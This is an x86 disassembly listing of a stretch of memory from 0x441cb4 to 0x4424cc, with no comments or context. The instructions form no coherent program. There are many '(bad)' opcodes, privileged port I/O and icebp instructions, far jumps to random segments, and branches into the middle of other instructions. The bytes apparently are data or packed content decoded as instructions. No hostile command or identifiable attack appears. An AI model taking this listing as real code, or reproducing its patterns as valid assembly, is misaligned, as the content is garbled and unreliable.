  441cb4:	sub    al,0x20
  441cb6:	mov    ah,0x35
  441cb8:	pushf  
  441cb9:	sbb    al,0xa7
  441cbb:	mov    ebx,edi
  441cbd:	adc    ah,bl
  441cbf:	dec    ebx
  441cc0:	in     eax,0xc7
  441cc2:	ins    BYTE PTR es:[edi],dx
  441cc3:	retf   0x246
  441cc6:	jp     0x441d12
  441cc8:	lock sbb BYTE PTR [edx],al
  441ccb:	test   DWORD PTR [ebx-0x31dc1634],0x7f457ff5
  441cd5:	int3   
  441cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441cd7:	mov    WORD PTR [eax+0x2e],cs
  441cda:	mov    eax,0x3b12b10c
  441cdf:	icebp  
  441ce0:	jge    0x441cf5
  441ce2:	or     DWORD PTR [ebx],0xad9d269f
  441ce8:	ret    0xa79
  441ceb:	sub    eax,0x8f0cccd7
  441cf0:	gs pop ecx
  441cf2:	xchg   edi,eax
  441cf3:	dec    edx
  441cf4:	mov    al,0x2b
  441cf6:	cli    
  441cf7:	xchg   ecx,eax
  441cf8:	cmp    DWORD PTR [esi+esi*8+0x57],0x4b39cc70
  441d00:	bound  ebx,QWORD PTR [ecx-0x65e41afe]
  441d06:	sbb    al,0x94
  441d08:	in     al,dx
  441d09:	sbb    cl,bh
  441d0b:	mov    dl,0x48
  441d0d:	sub    BYTE PTR [esi+0xd],0x62
  441d11:	xchg   edi,eax
  441d12:	cmp    edi,0xffffff86
  441d15:	addr16 std 
  441d17:	(bad)  
  441d18:	mov    ch,0x7e
  441d1a:	mov    eax,0x204ba5d0
  441d1f:	jl     0x441cae
  441d21:	stos   BYTE PTR es:[edi],al
  441d22:	sub    DWORD PTR [ebx],0x52
  441d25:	mov    ss,edi
  441d27:	xchg   ebx,eax
  441d28:	mov    ebx,DWORD PTR [eax-0x4bb52f12]
  441d2e:	loopne 0x441d13
  441d30:	js     0x441ccc
  441d32:	ja     0x441d55
  441d34:	push   ecx
  441d35:	and    DWORD PTR [ebp-0x6c],0x1a
  441d39:	icebp  
  441d3a:	shl    BYTE PTR cs:[eax+0x65],1
  441d3e:	pop    esp
  441d3f:	lock lock sub DWORD PTR [ecx-0x6],0x36b24079
  441d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441d49:	xor    DWORD PTR [eax],esi
  441d4b:	jmp    0x2a54:0x4dbd
  441d51:	ja     0x441d99
  441d53:	sub    DWORD PTR ds:0xfc424727,eax
  441d59:	or     DWORD PTR gs:[esi-0x4e],eax
  441d5d:	cmp    ebx,DWORD PTR [ebx-0x3f824532]
  441d63:	pop    eax
  441d64:	adc    BYTE PTR [ecx-0x77749385],al
  441d6a:	imul   ebx,DWORD PTR [ebx],0xb
  441d6d:	ins    BYTE PTR es:[edi],dx
  441d6e:	mov    DWORD PTR [edi],0xf1572efc
  441d74:	rcr    DWORD PTR [ebp-0x37e74ebf],1
  441d7a:	ins    BYTE PTR es:[edi],dx
  441d7b:	rcl    BYTE PTR [esi-0x2421a714],cl
  441d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441d82:	sub    al,0x98
  441d84:	imul   edx,DWORD PTR [ebp+0x4ee78396],0xafac79db
  441d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441d8f:	jno    0x441d3e
  441d91:	and    ah,BYTE PTR [eax+0xa92e303]
  441d97:	setno  BYTE PTR [eax-0x54]
  441d9b:	aam    0x87
  441d9d:	and    eax,DWORD PTR [ebp+0x3005b72e]
  441da3:	in     al,0x6c
  441da5:	sub    eax,0xc428eee0
  441daa:	loopne 0x441d6d
  441dac:	pop    ebx
  441dad:	repz adc eax,0x8df46b31
  441db3:	rcr    dh,cl
  441db5:	push   0xe4186545
  441dba:	mov    al,ds:0xc73fca20
  441dbf:	xor    dl,cl
  441dc1:	or     bh,BYTE PTR [edx-0x68]
  441dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441dc5:	leave  
  441dc6:	loopne 0x441e04
  441dc8:	jb     0x441e42
  441dca:	pusha  
  441dcb:	jge    0x441e0c
  441dcd:	jg     0x441d87
  441dcf:	and    eax,0x5f96f74b
  441dd4:	adc    eax,DWORD PTR [eax]
  441dd6:	sub    BYTE PTR ds:0xbaab25cc,0x30
  441ddd:	test   DWORD PTR [edi+0x3c7e6e35],0x5cbbd5a3
  441de7:	xchg   edx,eax
  441de8:	mov    ds:0x34bfb49,al
  441ded:	and    al,0x14
  441def:	sti    
  441df0:	or     BYTE PTR [edi],0x60
  441df3:	jle    0x441d8f
  441df5:	sub    esp,DWORD PTR [edx]
  441df7:	(bad)  
  441df8:	cmp    DWORD PTR [esi],esi
  441dfa:	aas    
  441dfb:	push   edi
  441dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441dfd:	ret    
  441dfe:	mov    ds:0xd5596c76,al
  441e03:	(bad)  
  441e04:	adc    al,0x78
  441e06:	mov    eax,0x2c069976
  441e0b:	test   DWORD PTR [eax+0x37],eax
  441e0e:	ret    
  441e0f:	fisttp WORD PTR [ebx+0x78]
  441e12:	push   ecx
  441e13:	sub    ch,cl
  441e15:	mov    al,0xfe
  441e17:	jmp    0x5973:0xe0eb5bf0
  441e1e:	aaa    
  441e1f:	sub    ecx,DWORD PTR ds:0x481b6fad
  441e25:	adc    BYTE PTR [ecx+ebp*4-0x61],ch
  441e29:	jne    0x441dfe
  441e2b:	mov    ds,WORD PTR [ebx-0x47]
  441e2e:	xlat   BYTE PTR ds:[ebx]
  441e2f:	add    dl,cl
  441e31:	sbb    cl,dl
  441e33:	jb     0x441e78
  441e35:	or     edi,DWORD PTR [ecx+0xd]
  441e38:	sub    ch,bh
  441e3a:	fwait
  441e3b:	lea    ebp,[eax+eiz*2]
  441e3e:	enter  0xa8a9,0x37
  441e42:	lods   eax,DWORD PTR ds:[esi]
  441e43:	pop    esp
  441e44:	push   0xbac08768
  441e49:	fdivr  st,st(3)
  441e4b:	inc    ebx
  441e4c:	sbb    ebp,DWORD PTR [eax+0x21]
  441e4f:	add    eax,0x5d35b321
  441e54:	shl    DWORD PTR [esi],1
  441e56:	xchg   ecx,eax
  441e57:	adc    eax,0x6dfb6598
  441e5c:	xor    eax,ebp
  441e5e:	mov    dh,0xea
  441e60:	sbb    eax,DWORD PTR [esp+eiz*4+0x2f2731c1]
  441e67:	shr    DWORD PTR [ecx+eax*1+0x24],1
  441e6b:	call   0x23a2:0x42a1f3fe
  441e72:	cmp    eax,0x413633e8
  441e77:	test   BYTE PTR [eax],dh
  441e79:	push   ecx
  441e7a:	fwait
  441e7b:	rcl    BYTE PTR [eax],cl
  441e7d:	rol    DWORD PTR [eax+0x62],1
  441e80:	and    eax,0x14b3e978
  441e85:	jmp    0x441e5b
  441e87:	shr    BYTE PTR [edx],0x38
  441e8a:	and    bh,BYTE PTR [edx]
  441e8c:	jg     0x441e28
  441e8e:	add    ebp,DWORD PTR [esp+eax*1+0x53db879f]
  441e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441e96:	or     al,0xc0
  441e98:	pop    edi
  441e99:	ins    DWORD PTR es:[edi],dx
  441e9a:	lea    edi,[edi+0x431d285b]
  441ea0:	dec    ecx
  441ea1:	loopne 0x441e86
  441ea3:	stc    
  441ea4:	pop    ecx
  441ea5:	jb     0x441e84
  441ea7:	lods   eax,DWORD PTR ds:[esi]
  441ea8:	mov    esp,0xe4265af5
  441ead:	jo     0x441f21
  441eaf:	jo     0x441e94
  441eb1:	sbb    eax,0xd97e4855
  441eb6:	scas   eax,DWORD PTR es:[edi]
  441eb7:	std    
  441eb8:	xlat   BYTE PTR ds:[ebx]
  441eb9:	les    eax,FWORD PTR [ecx-0x357396a0]
  441ebf:	inc    ebp
  441ec0:	and    ecx,esp
  441ec2:	add    bl,BYTE PTR [edi+ecx*1]
  441ec5:	inc    ecx
  441ec6:	and    eax,0x97716212
  441ecb:	or     al,0x4e
  441ecd:	ret    
  441ece:	xchg   esp,eax
  441ecf:	sub    al,0x7f
  441ed1:	jg     0x441eca
  441ed3:	jae    0x441eb9
  441ed5:	mov    dh,0x5d
  441ed7:	call   0xe2a0fc13
  441edc:	call   0xf04b4750
  441ee1:	fs movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  441ee4:	pop    ebp
  441ee5:	js     0x441ed7
  441ee7:	adc    BYTE PTR [ebx-0x4645a9c],cl
  441eed:	xlat   BYTE PTR ds:[ebx]
  441eee:	pop    ss
  441eef:	imul   eax,DWORD PTR [edi+0x3f5fa381],0x275f03bb
  441ef9:	cmp    eax,0xeffe60f8
  441efe:	mov    edx,0x4b8fd94b
  441f03:	push   0x45f11764
  441f08:	pop    ds
  441f09:	jg     0x441f4b
  441f0b:	xor    BYTE PTR [eax],0xa0
  441f0e:	aad    0xdf
  441f10:	xchg   DWORD PTR [eax+0x74],ebp
  441f13:	sbb    dh,ch
  441f15:	adc    BYTE PTR [ecx-0x6b367a77],ch
  441f1b:	pop    ecx
  441f1c:	inc    edi
  441f1d:	sbb    edx,DWORD PTR [ecx+0x5c]
  441f20:	push   esp
  441f21:	ja     0x441f0f
  441f23:	std    
  441f24:	test   eax,ebp
  441f26:	sbb    BYTE PTR [ebx],dl
  441f28:	dec    ebx
  441f29:	xchg   dl,cl
  441f2b:	cmp    dl,0x6b
  441f2e:	jle    0x441ef8
  441f30:	xor    bh,BYTE PTR [esi+0x3d39ece]
  441f36:	sbb    al,0x43
  441f38:	xor    al,0x63
  441f3a:	inc    esi
  441f3b:	push   0x6bb95ea3
  441f40:	jp     0x441fb4
  441f42:	xchg   BYTE PTR [edx-0x1a],ah
  441f45:	jle    0x441f98
  441f47:	pop    ecx
  441f48:	cmp    eax,0xca0551d7
  441f4d:	sub    eax,0x85cb2037
  441f52:	retf   0x1a25
  441f55:	push   edi
  441f56:	loop   0x441fa8
  441f58:	retw   0xe36d
  441f5c:	cs xchg esi,eax
  441f5e:	push   0xfffffff1
  441f60:	(bad)
  441f64:	cmp    al,bl
  441f66:	cs in  eax,0xe2
  441f69:	aaa    
  441f6a:	inc    eax
  441f6b:	cmp    DWORD PTR [esp+esi*8],0x3ad8986f
  441f72:	xchg   esp,eax
  441f73:	es rcl al,0x3e
  441f77:	shl    BYTE PTR [ebx-0x1402510c],1
  441f7d:	push   0x4dfe0417
  441f82:	inc    ebx
  441f83:	(bad)
  441f87:	in     al,0xe1
  441f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441f8a:	push   esi
  441f8b:	stc    
  441f8c:	enter  0x4d59,0xe9
  441f90:	push   0xe9d4700
  441f95:	and    ebx,0xffffff8b
  441f98:	imul   ebx,eax,0x83b85f84
  441f9e:	pop    ebx
  441f9f:	fwait
  441fa0:	mov    esp,0x49533255
  441fa5:	jle    0x441f72
  441fa7:	outs   dx,DWORD PTR ds:[esi]
  441fa8:	dec    edi
  441fa9:	(bad)  
  441faa:	in     eax,dx
  441fab:	lea    edi,[edx]
  441fad:	fadd   DWORD PTR [edi]
  441faf:	mov    BYTE PTR [eax+0x46368876],cl
  441fb5:	pushf  
  441fb6:	cmp    eax,0x779bf3ff
  441fbb:	mov    edi,0x90eed4bc
  441fc0:	dec    esi
  441fc1:	scas   eax,DWORD PTR es:[edi]
  441fc2:	sub    ah,BYTE PTR [ecx+0x25]
  441fc5:	add    esi,esp
  441fc7:	(bad)  
  441fc8:	js     0x442020
  441fca:	pop    esi
  441fcb:	push   ecx
  441fcc:	xor    bl,cl
  441fce:	neg    BYTE PTR [esi+edx*2+0x4f52a926]
  441fd5:	(bad)  
  441fd6:	arpl   WORD PTR ds:0xd4907667,bp
  441fdc:	or     al,0xc9
  441fde:	out    0x19,al
  441fe0:	and    eax,DWORD PTR [ebx+eax*8]
  441fe3:	push   esi
  441fe4:	jo     0x44202a
  441fe6:	or     ebp,DWORD PTR [ebp+0x68c8b26c]
  441fec:	pop    esp
  441fed:	pop    es
  441fee:	sbb    BYTE PTR [eax-0x53],ah
  441ff1:	retf   
  441ff2:	adc    eax,0xb22eef86
  441ff7:	inc    esp
  441ff8:	xor    edx,DWORD PTR [esi+ebp*4+0x6efb4fb1]
  441fff:	pop    ebx
  442000:	push   ebx
  442001:	dec    ebp
  442002:	xchg   esp,eax
  442003:	pop    eax
  442004:	pop    ss
  442005:	loop   0x442051
  442007:	paddusb mm0,QWORD PTR [esi+0x48856ca9]
  44200e:	in     al,dx
  44200f:	inc    eax
  442010:	iret   
  442011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442012:	daa    
  442013:	hlt    
  442014:	sbb    esp,DWORD PTR [ebx+0x2f]
  442017:	jae    0x441fd5
  442019:	jno    0x442034
  44201b:	stos   BYTE PTR es:[edi],al
  44201c:	push   ebp
  44201d:	xor    cl,dh
  44201f:	mov    ch,0x25
  442021:	and    eax,0x27d58d67
  442026:	(bad)  
  442027:	dec    edx
  442028:	cld    
  442029:	pop    ebx
  44202a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44202b:	cmp    BYTE PTR [ebx+0x52],0x2d
  44202f:	icebp  
  442030:	sbb    esi,DWORD PTR [ebx+0x5bacf69c]
  442036:	jg     0x44203a
  442038:	dec    eax
  442039:	jne    0x441fe3
  44203b:	xchg   edi,eax
  44203c:	cmp    al,0xd4
  44203e:	iret   
  44203f:	pop    ds
  442040:	mov    al,0x70
  442042:	test   BYTE PTR [ebp-0x68],al
  442045:	into   
  442046:	mov    ch,0xa9
  442048:	imul   eax,edi,0x26
  44204b:	fld    QWORD PTR [edx+0x2b82d3fb]
  442051:	clc    
  442052:	ins    DWORD PTR es:[edi],dx
  442053:	sub    ebp,edx
  442055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442056:	jns    0x441fe6
  442058:	in     eax,dx
  442059:	ror    BYTE PTR [ebp-0x3782515f],0xc9
  442060:	jg     0x441ff9
  442062:	cmp    dh,ch
  442064:	pop    DWORD PTR [ecx+0x19f67954]
  44206a:	(bad)  
  44206b:	iret   
  44206c:	mul    DWORD PTR [ebp-0x30]
  44206f:	addr16 sub cl,cl
  442072:	fwait
  442073:	fwait
  442074:	push   ss
  442075:	fild   DWORD PTR [ecx-0x2d]
  442078:	sub    DWORD PTR [edi],eax
  44207a:	ss in  eax,0x69
  44207d:	lods   al,BYTE PTR ds:[esi]
  44207e:	sub    edi,eax
  442080:	or     al,0x21
  442082:	test   BYTE PTR [esi+0x74],dh
  442085:	sti    
  442086:	push   esi
  442087:	popa   
  442088:	inc    esi
  442089:	inc    edx
  44208a:	adc    al,0x14
  44208c:	push   esi
  44208d:	push   ebx
  44208e:	stc    
  44208f:	or     esp,DWORD PTR [edi]
  442091:	pop    esp
  442092:	iret   
  442093:	pop    ds
  442094:	ja     0x442043
  442096:	xlat   BYTE PTR ds:[ebx]
  442097:	mov    al,ds:0x2444ee1c
  44209c:	or     ah,cl
  44209e:	call   0x55c2be6f
  4420a3:	stos   BYTE PTR es:[edi],al
  4420a4:	sbb    ah,BYTE PTR [eax-0x24]
  4420a7:	mov    ds:0xe2cff760,eax
  4420ac:	cmp    BYTE PTR [ecx-0xb3d9b2f],dh
  4420b2:	pusha  
  4420b3:	mov    al,0xf1
  4420b5:	jp     0x4420e8
  4420b7:	xchg   ebp,eax
  4420b8:	sub    al,0x21
  4420ba:	cmc    
  4420bb:	(bad)  
  4420bc:	cdq    
  4420bd:	into   
  4420be:	loopne 0x4420f8
  4420c0:	mov    eax,ds:0x156fa223
  4420c5:	shr    BYTE PTR [edi-0x77],1
  4420c8:	inc    eax
  4420c9:	jne    0x44208d
  4420cb:	call   0x4ecaea58
  4420d0:	scas   eax,DWORD PTR es:[edi]
  4420d1:	cli    
  4420d2:	lahf   
  4420d3:	mov    esp,0xa982c31c
  4420d8:	jle    0x442119
  4420da:	adc    BYTE PTR [ebp-0x7fd8f950],dh
  4420e0:	rcl    BYTE PTR [edi-0x14],0xc
  4420e4:	scas   eax,DWORD PTR es:[edi]
  4420e5:	adc    ebp,DWORD PTR [esi+0x5e5f76d6]
  4420eb:	cmp    eax,0xd9bb267
  4420f0:	adc    eax,DWORD PTR [esi+0xeba55f0]
  4420f6:	add    DWORD PTR [eax-0x20ee73fd],ecx
  4420fc:	and    DWORD PTR [edi],ebx
  4420fe:	inc    edx
  4420ff:	retf   
  442100:	icebp  
  442101:	aad    0xe4
  442103:	adc    BYTE PTR [edx-0x26a06aaa],bl
  442109:	xor    ah,BYTE PTR ds:0xd41e2aa4
  44210f:	mov    dh,0x47
  442111:	sti    
  442112:	xchg   edi,eax
  442113:	mov    edx,0xe40eb7c6
  442118:	jg     0x442146
  44211a:	retf   0x4e8c
  44211d:	sub    eax,0xfe6df18f
  442122:	mov    DWORD PTR ds:0x3af2a84f,0xc6c53f
  44212c:	sar    DWORD PTR [edx-0x65],1
  44212f:	ret    0x9572
  442132:	fs loope 0x4421a1
  442135:	dec    edx
  442136:	sub    ch,BYTE PTR [eax-0x5f415c5]
  44213c:	cmp    al,0xfa
  44213e:	jmp    0x1405:0x14873ce9
  442145:	repnz out dx,eax
  442147:	sbb    al,0x2c
  44214a:	repz shr BYTE PTR [ecx+0x4d],cl
  44214e:	test   BYTE PTR [eax+0x20a63047],bh
  442154:	adc    al,0x56
  442156:	or     eax,DWORD PTR [edi+ecx*8]
  442159:	or     al,0xcb
  44215b:	sbb    dl,cl
  44215d:	js     0x442110
  44215f:	inc    ebp
  442160:	dec    edi
  442161:	jmp    0xb67758b1
  442166:	bt     DWORD PTR [esi-0x6a87a810],ebx
  44216d:	pop    eax
  44216e:	dec    ebp
  44216f:	dec    ebx
  442170:	xchg   ebx,eax
  442171:	loope  0x4421e8
  442173:	mov    BYTE PTR [edi+0x32],dl
  442176:	iret   
  442177:	xchg   ebp,eax
  442178:	sub    DWORD PTR [ecx+0x35],edx
  44217b:	fbld   TBYTE PTR [ebx-0x7]
  44217e:	jmp    FWORD PTR [ecx+0x3344fb25]
  442184:	test   eax,0x73812968
  442189:	pop    esp
  44218a:	mov    eax,0x6bf8fcd3
  44218f:	xchg   BYTE PTR [edx+0x33],bh
  442192:	in     al,0xe3
  442194:	sbb    BYTE PTR [ebx+0x61],0xff
  442198:	cs mov esp,ecx
  44219b:	pop    es
  44219c:	out    0xe0,eax
  44219e:	loop   0x44218c
  4421a0:	es mov al,cl
  4421a3:	jp     0x44212f
  4421a5:	ficomp WORD PTR [esi-0x6d]
  4421a8:	inc    edx
  4421a9:	and    al,0xdb
  4421ab:	(bad)  
  4421ac:	(bad)  
  4421ad:	inc    edx
  4421ae:	fld    DWORD PTR [eax]
  4421b0:	add    al,0xfe
  4421b2:	cmc    
  4421b3:	pop    eax
  4421b4:	cmc    
  4421b5:	stos   DWORD PTR es:[edi],eax
  4421b6:	sub    DWORD PTR [edi-0x64],edi
  4421b9:	inc    ebx
  4421ba:	fcmovb st,st(2)
  4421bc:	out    dx,eax
  4421bd:	rol    BYTE PTR [edx-0x6f2da43d],cl
  4421c3:	sub    bh,BYTE PTR [edi-0x79]
  4421c6:	pusha  
  4421c7:	mov    ds:0x71a33c83,al
  4421cc:	mov    bl,0x30
  4421ce:	mov    eax,0x94136309
  4421d3:	xor    dl,bh
  4421d5:	iret   
  4421d6:	xchg   esp,eax
  4421d7:	jl     0x442176
  4421d9:	rol    ebx,0x70
  4421dc:	popw   ss
  4421de:	cmp    al,0x87
  4421e0:	xchg   esi,eax
  4421e1:	xchg   DWORD PTR [eax+0x11],eax
  4421e4:	push   edx
  4421e5:	push   0x9047ba1f
  4421ea:	outs   dx,DWORD PTR ds:[esi]
  4421eb:	bnd jb 0x4421a5
  4421ee:	test   eax,0x9fa42539
  4421f3:	mov    esi,0xed08bf1d
  4421f8:	(bad)
  4421fb:	sub    DWORD PTR ds:0xcc915ef1,ebx
  442201:	mov    eax,ds:0xb87b197f
  442206:	in     al,0xc3
  442208:	inc    esp
  442209:	dec    ecx
  44220a:	cdq    
  44220b:	lods   eax,DWORD PTR ds:[esi]
  44220c:	pop    edx
  44220d:	dec    esi
  44220e:	sti    
  44220f:	sbb    BYTE PTR [ecx-0x15],0xe1
  442213:	lea    edx,[ecx-0x521ac0e8]
  442219:	xor    al,0x79
  44221b:	test   eax,0x94fe0c48
  442220:	add    al,0x66
  442222:	add    BYTE PTR [edi-0x18],ah
  442225:	les    ebp,FWORD PTR [esi+0x1e2d4703]
  44222b:	xchg   ecx,eax
  44222c:	cmp    eax,0x46bdc7b1
  442231:	cs inc eax
  442233:	jle    0x44223b
  442235:	inc    ebx
  442236:	mov    ecx,0xa12c3d25
  44223b:	imul   esi,DWORD PTR [eax],0x29
  44223e:	push   ds
  44223f:	out    dx,al
  442240:	xchg   ebx,eax
  442241:	xchg   esi,eax
  442242:	xor    BYTE PTR [ebp-0x29],al
  442245:	gs repz inc eax
  442248:	sahf   
  442249:	mov    esp,0xabb8181f
  44224e:	leave  
  44224f:	nop
  442250:	push   ebp
  442251:	loope  0x4421f7
  442253:	mov    WORD PTR [eax-0x6657b061],?
  442259:	shl    eax,1
  44225b:	sub    al,0xb4
  44225d:	xor    ecx,DWORD PTR [eax]
  44225f:	je     0x44227f
  442261:	sub    ecx,DWORD PTR [esi-0x9c0ca0]
  442267:	stos   DWORD PTR es:[edi],eax
  442268:	push   ebp
  442269:	add    BYTE PTR [edi+eiz*1+0x77d81af1],bl
  442270:	ja     0x4422ef
  442272:	lds    ecx,FWORD PTR [ecx+0x7b25988d]
  442278:	cmp    al,0x52
  44227a:	inc    edx
  44227b:	shr    BYTE PTR [ebp+0x5f8c42a],1
  442281:	je     0x44227e
  442283:	shr    BYTE PTR [ecx+0x52],cl
  442286:	xlat   BYTE PTR ds:[ebx]
  442287:	and    eax,0x2635e645
  44228c:	test   eax,0x2dcd4efd
  442291:	dec    ebx
  442292:	add    al,0x0
  442294:	(bad)  
  442295:	ret    0x93a5
  442298:	int    0x25
  44229a:	sub    edx,ebx
  44229c:	inc    esp
  44229d:	mov    ebp,0x6c3639b3
  4422a2:	or     BYTE PTR [eax-0x392cb49c],al
  4422a8:	out    0xfa,eax
  4422aa:	xchg   ebp,eax
  4422ab:	enter  0xce8e,0x50
  4422af:	sahf   
  4422b0:	mov    WORD PTR [ebp-0x1d86cbac],fs
  4422b6:	aas    
  4422b7:	xor    ebx,DWORD PTR [edx]
  4422b9:	jl     0x44227e
  4422bb:	in     eax,0x67
  4422bd:	inc    esi
  4422be:	mov    cl,0xe
  4422c0:	adc    DWORD PTR [edi-0x4b],ebx
  4422c3:	jmp    0xb8647e19
  4422c8:	imul   esp,esi,0xc0593c8b
  4422ce:	imul   ebp,DWORD PTR [eax],0xd2429370
  4422d4:	imul   esp,DWORD PTR [edi],0x4d74efc1
  4422da:	loopne 0x442315
  4422dc:	xchg   ecx,eax
  4422dd:	adc    BYTE PTR [esi],0x97
  4422e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4422e1:	out    dx,eax
  4422e2:	xor    ebx,edi
  4422e4:	inc    esi
  4422e5:	and    dh,dh
  4422e7:	dec    esp
  4422e8:	fdivr  QWORD PTR [edi-0x1ec70be1]
  4422ee:	jge    0x4422c2
  4422f0:	sbb    DWORD PTR [esi],0xffffff8a
  4422f3:	inc    esp
  4422f4:	jmp    0x4422fc
  4422f6:	call   0xfc6f87ca
  4422fb:	rcr    esi,cl
  4422fd:	jb     0x44231d
  4422ff:	sbb    eax,0x369f937f
  442304:	fld    DWORD PTR [esi]
  442306:	xchg   DWORD PTR gs:[edi-0x6b903fda],ecx
  44230d:	sub    bl,bl
  44230f:	inc    ebx
  442310:	mov    ebp,DWORD PTR fs:[ebp-0x16878de8]
  442317:	push   ebx
  442318:	cs sub eax,0x77108c27
  44231e:	push   ss
  44231f:	pop    esp
  442320:	xor    DWORD PTR [edx-0xc],0x3302b3ea
  442327:	(bad)  
  442329:	mov    dh,0x32
  44232b:	jmp    0x44236d
  44232d:	es icebp 
  44232f:	lds    edx,FWORD PTR ds:0x99ac5a12
  442335:	sbb    edi,ebp
  442337:	or     ebp,DWORD PTR [edx]
  442339:	jmp    0x4219:0xa59db5fd
  442340:	arpl   WORD PTR [edi],si
  442342:	ins    DWORD PTR es:[edi],dx
  442343:	outs   dx,DWORD PTR ds:[esi]
  442344:	sbb    eax,0x50068f4b
  442349:	aaa    
  44234a:	enter  0xf8b4,0x71
  44234e:	pop    edi
  44234f:	outs   dx,DWORD PTR ds:[esi]
  442350:	mov    ebp,0x6fae9deb
  442355:	aam    0x1e
  442357:	pop    DWORD PTR [edi-0x5a2c2ac8]
  44235d:	out    0x9c,al
  44235f:	in     al,dx
  442360:	dec    ebx
  442361:	icebp  
  442362:	sub    BYTE PTR [ebp+0x7e],dl
  442365:	mov    edx,0x3a408d74
  44236a:	mov    ds:0x152a56c7,eax
  44236f:	ret    
  442370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442371:	jmp    0x4423ea
  442373:	jnp    0x4423a8
  442375:	test   eax,0x67072d26
  44237a:	sbb    ah,bh
  44237c:	xchg   ecx,eax
  44237d:	enter  0x8c4b,0xfd
  442381:	add    DWORD PTR [ebx-0x6a],edi
  442384:	adc    ebp,DWORD PTR [edi]
  442386:	sbb    al,0xc2
  442388:	add    al,0xc7
  44238a:	jl     0x44231d
  44238c:	(bad)  
  44238d:	mov    ah,0xa0
  44238f:	ins    BYTE PTR es:[edi],dx
  442390:	test   al,0x2
  442392:	add    dl,ch
  442394:	imul   esp,DWORD PTR [ebp+0x52fec2a8],0x7049e259
  44239e:	imul   eax,DWORD PTR [edx+0x58],0x24be5e08
  4423a5:	loopne 0x4423fd
  4423a7:	jns    0x442361
  4423a9:	imul   esp,DWORD PTR [eax+ebp*1],0x86df89e1
  4423b0:	hlt    
  4423b1:	hlt    
  4423b2:	int    0x2d
  4423b4:	gs retf 0xf6ac
  4423b8:	sbb    bh,BYTE PTR ds:0x2f4e0750
  4423be:	shl    BYTE PTR [edi-0x69],cl
  4423c1:	or     BYTE PTR [ebp-0x2f69a65c],bl
  4423c7:	xor    DWORD PTR ds:0x8af66677,ecx
  4423cd:	fistp  DWORD PTR [edi+eax*8]
  4423d0:	out    dx,eax
  4423d1:	js     0x44244b
  4423d3:	lea    esp,[edx-0x28a2c6ef]
  4423d9:	lea    esp,[edx+0x41]
  4423dc:	aam    0x2b
  4423de:	mov    dh,BYTE PTR [edx]
  4423e0:	sub    DWORD PTR [edx-0x2d435cd9],eax
  4423e6:	clc    
  4423e7:	imul   ebp,DWORD PTR [ebx],0x3f3761b1
  4423ed:	cmp    BYTE PTR [eax+0x2905b4c8],0xa8
  4423f4:	out    0x17,al
  4423f6:	push   0xcb655161
  4423fb:	mov    eax,ds:0x31c4ea78
  442400:	int    0x4
  442402:	xor    BYTE PTR [eax-0x6c],ch
  442405:	ins    DWORD PTR es:[edi],dx
  442406:	pushf  
  442407:	mov    al,0x2f
  442409:	psraw  mm5,QWORD PTR [ebp-0x617c1b40]
  442410:	mov    cl,0x43
  442412:	xchg   esi,eax
  442413:	pushf  
  442414:	fs push ebx
  442416:	mul    BYTE PTR ds:0x7de87a80
  44241c:	mov    ebp,0x37c1ffeb
  442421:	cmp    BYTE PTR [edi-0x7857054c],ch
  442427:	(bad)  
  442429:	dec    edx
  44242a:	mov    ebx,0x49161fa
  44242f:	pop    esp
  442430:	fcomp  DWORD PTR [esp+eiz*4-0x38]
  442434:	or     edi,DWORD PTR [ebx-0x4f]
  442437:	sub    dh,BYTE PTR [ebp-0x7b]
  44243a:	jl     0x442424
  44243c:	div    bl
  44243e:	stos   DWORD PTR es:[edi],eax
  44243f:	inc    esi
  442440:	test   al,0x5a
  442442:	pop    edi
  442443:	fnsave [esi+ebx*4-0x39]
  442447:	std    
  442448:	js     0x4424ba
  44244a:	push   ebp
  44244b:	xchg   esi,eax
  44244c:	and    al,0x5c
  44244e:	aas    
  44244f:	imul   ch
  442451:	push   ss
  442452:	sbb    edx,DWORD PTR [ebp+0x3]
  442455:	pop    esp
  442456:	jle    0x442491
  442458:	cdq    
  442459:	fidivr WORD PTR [edx]
  44245b:	lds    ebp,FWORD PTR [edx]
  44245d:	in     eax,dx
  44245e:	jg     0x44241a
  442460:	mov    WORD PTR [ebx-0x31],gs
  442463:	nop
  442464:	mov    bh,0xd4
  442466:	mov    dl,0x4a
  442468:	mov    eax,0x8c581769
  44246d:	sar    DWORD PTR [esi+0x7fbe3df6],0x21
  442474:	add    eax,0x57fb413f
  442479:	popf   
  44247a:	or     cl,BYTE PTR [edx]
  44247c:	and    edx,DWORD PTR [edi-0x62]
  44247f:	in     eax,dx
  442480:	out    dx,eax
  442481:	push   edx
  442482:	sub    esp,DWORD PTR [edx-0x788aeb18]
  442488:	adc    dh,BYTE PTR ds:0x75c1d035
  44248e:	inc    ebx
  44248f:	(bad)  
  442490:	je     0x442492
  442492:	xor    BYTE PTR [ebx+0x7701572c],0xb0
  442499:	xor    BYTE PTR cs:[esi-0x5d],ch
  44249d:	outs   dx,DWORD PTR ds:[esi]
  44249e:	cwde   
  44249f:	xchg   edx,eax
  4424a0:	fwait
  4424a1:	rcr    bl,1
  4424a3:	sti    
  4424a4:	aam    0x54
  4424a6:	ja     0x44244b
  4424a8:	inc    edi
  4424a9:	retf   
  4424aa:	in     eax,dx
  4424ab:	adc    BYTE PTR [ecx-0x4c5cb2ec],cl
  4424b1:	sbb    BYTE PTR ds:0xca3e77c4,dl
  4424b7:	and    eax,0xf99d91a
  4424bc:	push   edx
  4424bd:	aam    0xa
  4424bf:	sub    eax,0xf0d8f600
  4424c4:	jnp    0x44249b
  4424c6:	adc    eax,0x43446386
  4424cb:	ins    BYTE PTR es:[edi],dx
  4424cc:	mov    esp,0xc6849195
